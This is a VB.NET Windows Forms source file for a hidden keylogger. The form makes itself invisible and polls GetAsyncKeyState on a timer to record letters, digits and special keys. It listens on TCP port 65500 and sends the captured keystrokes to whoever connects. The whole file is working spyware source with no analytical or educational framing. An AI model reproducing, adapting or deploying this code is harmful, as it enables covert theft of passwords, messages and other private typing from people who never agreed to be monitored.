Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32.dll" (ByVal key As Int32) As Int16
    Dim tcplist As TcpListener
    Dim ns As NetworkStream
    Dim tcp As New TcpClient
    Dim msgs As String
    Private th As Thread = Nothing
    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        tcplist = New TcpListener(65500)
        tcplist.Start()
        tcp = tcplist.AcceptTcpClient
        ns = tcp.GetStream
        Timer1.Start()
        Me.th = New Thread(
        New ThreadStart(AddressOf Me.re))
        Me.th.IsBackground = True
        Me.th.Start()
    End Sub
    Delegate Sub SetTextCallback([text] As String)
    Private Sub SetText(ByVal [text] As String)
        If Me.RichTextBox1.InvokeRequired Then
            Dim d As New SetTextCallback(AddressOf SetText)
            Me.Invoke(d, New Object() {[text]})
        Else
            Me.msgs = "KeySniff Dump Time: " + Date.Now.ToString + vbCrLf + [text] + Me.RichTextBox1.Text + vbCrLf
        End If
    End Sub
    Private Sub re()
        While True
            Try
                tcp = New TcpClient
                Dim read As Byte() = New Byte(1000) {}
                ns.Read(read, 0, read.Length)
                ns.Flush()
                Dim msg As String = Encoding.ASCII.GetString(read)
                Me.SetText("KeyLogger:")
                Dim com As Byte() = Encoding.ASCII.GetBytes(msgs)
                ns.Write(com, 0, com.Length)
                ns.Flush()
                RichTextBox1.Text = ""
            Catch
                tcp.Close()
                ns.Close()
                End
            End Try
        End While
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Visible = False
        If (GetAsyncKeyState(Keys.A)) Then
            RichTextBox1.Text = RichTextBox1.Text + "a"
        ElseIf (GetAsyncKeyState(Keys.B)) Then
            RichTextBox1.Text = RichTextBox1.Text + "b"
        ElseIf (GetAsyncKeyState(Keys.C)) Then
            RichTextBox1.Text = RichTextBox1.Text + "c"
        ElseIf (GetAsyncKeyState(Keys.D)) Then
            RichTextBox1.Text = RichTextBox1.Text + "d"
        ElseIf (GetAsyncKeyState(Keys.E)) Then
            RichTextBox1.Text = RichTextBox1.Text + "e"
        ElseIf (GetAsyncKeyState(Keys.F)) Then
            RichTextBox1.Text = RichTextBox1.Text + "f"
        ElseIf (GetAsyncKeyState(Keys.G)) Then
            RichTextBox1.Text = RichTextBox1.Text + "g"
        ElseIf (GetAsyncKeyState(Keys.H)) Then
            RichTextBox1.Text = RichTextBox1.Text + "h"
        ElseIf (GetAsyncKeyState(Keys.I)) Then
            RichTextBox1.Text = RichTextBox1.Text + "i"
        ElseIf (GetAsyncKeyState(Keys.J)) Then
            RichTextBox1.Text = RichTextBox1.Text + "j"
        ElseIf (GetAsyncKeyState(Keys.K)) Then
            RichTextBox1.Text = RichTextBox1.Text + "k"
        ElseIf (GetAsyncKeyState(Keys.L)) Then
            RichTextBox1.Text = RichTextBox1.Text + "l"
        ElseIf (GetAsyncKeyState(Keys.M)) Then
            RichTextBox1.Text = RichTextBox1.Text + "m"
        ElseIf (GetAsyncKeyState(Keys.N)) Then
            RichTextBox1.Text = RichTextBox1.Text + "n"
        ElseIf (GetAsyncKeyState(Keys.O)) Then
            RichTextBox1.Text = RichTextBox1.Text + "o"
        ElseIf (GetAsyncKeyState(Keys.P)) Then
            RichTextBox1.Text = RichTextBox1.Text + "p"
        ElseIf (GetAsyncKeyState(Keys.Q)) Then
            RichTextBox1.Text = RichTextBox1.Text + "q"
        ElseIf (GetAsyncKeyState(Keys.R)) Then
            RichTextBox1.Text = RichTextBox1.Text + "r"
        ElseIf (GetAsyncKeyState(Keys.S)) Then
            RichTextBox1.Text = RichTextBox1.Text + "s"
        ElseIf (GetAsyncKeyState(Keys.T)) Then
            RichTextBox1.Text = RichTextBox1.Text + "t"
        ElseIf (GetAsyncKeyState(Keys.U)) Then
            RichTextBox1.Text = RichTextBox1.Text + "u"
        ElseIf (GetAsyncKeyState(Keys.V)) Then
            RichTextBox1.Text = RichTextBox1.Text + "v"
        ElseIf (GetAsyncKeyState(Keys.W)) Then
            RichTextBox1.Text = RichTextBox1.Text + "w"
        ElseIf (GetAsyncKeyState(Keys.X)) Then
            RichTextBox1.Text = RichTextBox1.Text + "x"
        ElseIf (GetAsyncKeyState(Keys.Y)) Then
            RichTextBox1.Text = RichTextBox1.Text + "y"
        ElseIf (GetAsyncKeyState(Keys.Z)) Then
            RichTextBox1.Text = RichTextBox1.Text + "z"
        ElseIf (GetAsyncKeyState(Keys.D0)) Then
            RichTextBox1.Text = RichTextBox1.Text + "0"
        ElseIf (GetAsyncKeyState(Keys.D1)) Then
            RichTextBox1.Text = RichTextBox1.Text + "1"
        ElseIf (GetAsyncKeyState(Keys.D2)) Then
            RichTextBox1.Text = RichTextBox1.Text + "2"
        ElseIf (GetAsyncKeyState(Keys.D3)) Then
            RichTextBox1.Text = RichTextBox1.Text + "3"
        ElseIf (GetAsyncKeyState(Keys.D4)) Then
            RichTextBox1.Text = RichTextBox1.Text + "4"
        ElseIf (GetAsyncKeyState(Keys.D5)) Then
            RichTextBox1.Text = RichTextBox1.Text + "5"
        ElseIf (GetAsyncKeyState(Keys.D6)) Then
            RichTextBox1.Text = RichTextBox1.Text + "6"
        ElseIf (GetAsyncKeyState(Keys.D7)) Then
            RichTextBox1.Text = RichTextBox1.Text + "7"
        ElseIf (GetAsyncKeyState(Keys.D8)) Then
            RichTextBox1.Text = RichTextBox1.Text + "8"
        ElseIf (GetAsyncKeyState(Keys.D9)) Then
            RichTextBox1.Text = RichTextBox1.Text + "9"
        ElseIf (GetAsyncKeyState(Keys.NumPad0)) Then
            RichTextBox1.Text = RichTextBox1.Text + "0"
        ElseIf (GetAsyncKeyState(Keys.NumPad1)) Then
            RichTextBox1.Text = RichTextBox1.Text + "1"
        ElseIf (GetAsyncKeyState(Keys.NumPad2)) Then
            RichTextBox1.Text = RichTextBox1.Text + "2"
        ElseIf (GetAsyncKeyState(Keys.NumPad3)) Then
            RichTextBox1.Text = RichTextBox1.Text + "3"
        ElseIf (GetAsyncKeyState(Keys.NumPad4)) Then
            RichTextBox1.Text = RichTextBox1.Text + "4"
        ElseIf (GetAsyncKeyState(Keys.NumPad5)) Then
            RichTextBox1.Text = RichTextBox1.Text + "5"
        ElseIf (GetAsyncKeyState(Keys.NumPad6)) Then
            RichTextBox1.Text = RichTextBox1.Text + "6"
        ElseIf (GetAsyncKeyState(Keys.NumPad7)) Then
            RichTextBox1.Text = RichTextBox1.Text + "7"
        ElseIf (GetAsyncKeyState(Keys.NumPad8)) Then
            RichTextBox1.Text = RichTextBox1.Text + "8"
        ElseIf (GetAsyncKeyState(Keys.NumPad9)) Then
            RichTextBox1.Text = RichTextBox1.Text + "9"
        ElseIf (GetAsyncKeyState(Keys.Add)) Then
            RichTextBox1.Text = RichTextBox1.Text + "+"
        ElseIf (GetAsyncKeyState(Keys.Alt)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Alt]"
        ElseIf (GetAsyncKeyState(Keys.Apps)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Apps]"
        ElseIf (GetAsyncKeyState(Keys.Attn)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Attn]"
        ElseIf (GetAsyncKeyState(Keys.IMEAccept)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[IME]"
        ElseIf (GetAsyncKeyState(Keys.BrowserBack)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserBack]"
        ElseIf (GetAsyncKeyState(Keys.BrowserFavorites)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserFavorites]"
        ElseIf (GetAsyncKeyState(Keys.BrowserForward)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserForward]"
        ElseIf (GetAsyncKeyState(Keys.BrowserHome)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserHome]"
        ElseIf (GetAsyncKeyState(Keys.BrowserRefresh)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserRefresh]"
        ElseIf (GetAsyncKeyState(Keys.BrowserSearch)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserSearch]"
        ElseIf (GetAsyncKeyState(Keys.BrowserStop)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[BrowserStop]"
        ElseIf (GetAsyncKeyState(Keys.Cancel)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Cancel]"
        ElseIf (GetAsyncKeyState(Keys.CapsLock)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[CapsLock]"
        ElseIf (GetAsyncKeyState(Keys.Clear)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Clear]"
        ElseIf (GetAsyncKeyState(Keys.Control)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Control]"
        ElseIf (GetAsyncKeyState(Keys.ControlKey)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Ctrl]"
        ElseIf (GetAsyncKeyState(Keys.Crsel)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Crsel]"
        ElseIf (GetAsyncKeyState(Keys.Decimal)) Then
            RichTextBox1.Text = RichTextBox1.Text + "."
        ElseIf (GetAsyncKeyState(Keys.Delete)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Delete]"
        ElseIf (GetAsyncKeyState(Keys.Divide)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Divide]"
        ElseIf (GetAsyncKeyState(Keys.Down)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[↓]"
        ElseIf (GetAsyncKeyState(Keys.End)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[end]"
        ElseIf (GetAsyncKeyState(Keys.Enter)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Enter]"
        ElseIf (GetAsyncKeyState(Keys.EraseEof)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[EraseEof]"
        ElseIf (GetAsyncKeyState(Keys.Escape)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[ESC]"
        ElseIf (GetAsyncKeyState(Keys.Execute)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Execute]"
        ElseIf (GetAsyncKeyState(Keys.Exsel)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Exsel]"
        ElseIf (GetAsyncKeyState(Keys.F1)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F1]"
        ElseIf (GetAsyncKeyState(Keys.F2)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F2]"
        ElseIf (GetAsyncKeyState(Keys.F3)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F3]"
        ElseIf (GetAsyncKeyState(Keys.F4)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F4]"
        ElseIf (GetAsyncKeyState(Keys.F5)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F5]"
        ElseIf (GetAsyncKeyState(Keys.F6)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F6]"
        ElseIf (GetAsyncKeyState(Keys.F7)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F7]"
        ElseIf (GetAsyncKeyState(Keys.F8)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F8]"
        ElseIf (GetAsyncKeyState(Keys.F9)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F9]"
        ElseIf (GetAsyncKeyState(Keys.F10)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F10]"
        ElseIf (GetAsyncKeyState(Keys.F11)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F11]"
        ElseIf (GetAsyncKeyState(Keys.F12)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[F12]"
        ElseIf (GetAsyncKeyState(Keys.Home)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[HOME]"
        ElseIf (GetAsyncKeyState(Keys.LaunchMail)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[LaunchMail]"
        ElseIf (GetAsyncKeyState(Keys.LControlKey)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[LControlKey]"
        ElseIf (GetAsyncKeyState(Keys.Left)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[←]"
        ElseIf (GetAsyncKeyState(Keys.LineFeed)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[LineFeed]"
        ElseIf (GetAsyncKeyState(Keys.LMenu)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[LMenu]"
        ElseIf (GetAsyncKeyState(Keys.LWin)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Lwin]"
        ElseIf (GetAsyncKeyState(Keys.MButton)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[MButton]"
        ElseIf (GetAsyncKeyState(Keys.Menu)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Menu]"
        ElseIf (GetAsyncKeyState(Keys.Multiply)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Multiply]"
        ElseIf (GetAsyncKeyState(Keys.Next)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Next]"
        ElseIf (GetAsyncKeyState(Keys.Oem1)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem1]"
        ElseIf (GetAsyncKeyState(Keys.Oem2)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem2]"
        ElseIf (GetAsyncKeyState(Keys.Oem102)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem102]"
        ElseIf (GetAsyncKeyState(Keys.Oem3)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem3]"
        ElseIf (GetAsyncKeyState(Keys.Oem4)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem4]"
        ElseIf (GetAsyncKeyState(Keys.Oem5)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem5]"
        ElseIf (GetAsyncKeyState(Keys.Oem6)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem6]"
        ElseIf (GetAsyncKeyState(Keys.Oem7)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem7]"
        ElseIf (GetAsyncKeyState(Keys.Oem8)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Oem8]"
        ElseIf (GetAsyncKeyState(Keys.OemOpenBrackets)) Then
            RichTextBox1.Text = RichTextBox1.Text + "{"
        ElseIf (GetAsyncKeyState(Keys.Oemcomma)) Then
            RichTextBox1.Text = RichTextBox1.Text + ","
        ElseIf (GetAsyncKeyState(Keys.OemMinus)) Then
            RichTextBox1.Text = RichTextBox1.Text + "-"
        ElseIf (GetAsyncKeyState(Keys.OemPeriod)) Then
            RichTextBox1.Text = RichTextBox1.Text + "."
        ElseIf (GetAsyncKeyState(Keys.OemPipe)) Then
            RichTextBox1.Text = RichTextBox1.Text + ">"
        ElseIf (GetAsyncKeyState(Keys.OemQuestion)) Then
            RichTextBox1.Text = RichTextBox1.Text + "?"
        ElseIf (GetAsyncKeyState(Keys.Oemtilde)) Then
            RichTextBox1.Text = RichTextBox1.Text + "~"
        ElseIf (GetAsyncKeyState(Keys.PageDown)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[PageDown]"
        ElseIf (GetAsyncKeyState(Keys.PageUp)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[PageUp]"
        ElseIf (GetAsyncKeyState(Keys.RControlKey)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[RControlKey]"
        ElseIf (GetAsyncKeyState(Keys.Right)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[→]"
        ElseIf (GetAsyncKeyState(Keys.RMenu)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[RMenu]"
        ElseIf (GetAsyncKeyState(Keys.RWin)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[RWin]"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[ShiftKey]"
        ElseIf (GetAsyncKeyState(Keys.Space)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Space]"
        ElseIf (GetAsyncKeyState(Keys.Tab)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[Tab]"
        ElseIf (GetAsyncKeyState(Keys.Up)) Then
            RichTextBox1.Text = RichTextBox1.Text + "[↑]"
        End If
    End Sub
End Class

